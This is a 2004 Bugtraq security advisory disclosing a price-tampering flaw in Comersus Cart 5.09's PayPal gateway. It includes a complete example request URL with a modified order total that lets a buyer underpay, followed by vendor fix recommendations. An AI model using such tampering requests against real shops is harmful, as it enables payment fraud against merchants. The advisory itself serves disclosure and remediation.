
Date: Wed, 7 Jul 2004 11:15:19 -0400
From: "Thomas Ryan" <tommy@...videsecurity.com>
To: <bugtraq@...urityfocus.com>
Cc: <full-disclosure-admin@...ts.netsys.com>
Subject: Comersus Cart Improper Request Handling


Comersus Cart Improper Request Handling 

Release Date:
July 6, 2004

Severity:
Medium

Vendor:
Comersus Open Technologies

Software:
Tested on Comersus Cart 5.09
Previous versions may also be affected.

Remote:
Remotely executed from any web browser

Technical Details:
The unethical user is able to modify the parameters to change the pricing
before the order is processed through PayPal.  This would allow the
unethical user to place a fraudulent transaction which many times isn't
caught until the product is already shipped OR the shopping cart owner is
charged a chargeback fee when refunding the order.

Example:

http://[VICTIM]/comersus/store/comersus_gatewayPayPal.asp?idOrder=2002&Order
Total=|102|222|228|22|130|36|209&name=Thomas&lastName=Ryan&address=123+Easy+
Modify+Street&city=New+York&state=NY&zip=10001&country=US&phone=212%2D857%2D
1731&email=tommy%40providesecurity%2Ecom&orderDetails=1x+%23RDHT%2F11+Red+Ha
t+Deluxe+WorkStation+Options%3A+%3D+%2479%2E00%0D%0A2x+%23WME%2F1+Windows+Mi
llennium+Edition+Options%3A+%3D+%24398%2E00%0D%0A1x+%23BPRES2%2F6+So+You+Wan
t+to+Be+President%3F+Options%3A+%3D+%2414%2E39%0D%0A


Vendor Fix:
Update to 5.098
http://www.comersus.com/
Use <form method="POST" on all Forms
Also recommend using SSL for ALL Transactional areas of the website.
Review all orders before processing

Credit:
Discovered By: Thomas Ryan
Provide Security

Original Advisory
http://www.providesecurity.com/research/advisories/07062004-02.asp

Copyright (c) 2004 Provide Security
Permission is hereby granted for the redistribution of this alert
electronically. It is not to be edited in any way without the expressed
written consent of Provide Security. If you wish to reprint the whole or any
part of this advisory in any other medium excluding electronic medium,
please email secalert@...videsecurity.com for permission.

Disclaimer
The information within this paper may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There are
no warranties, implied or express, with regard to this information. In no
event shall the author be liable for any direct or indirect damages
whatsoever arising out of or in connection with the use or spread of this
information. Any use of this information is at the user's own risk.



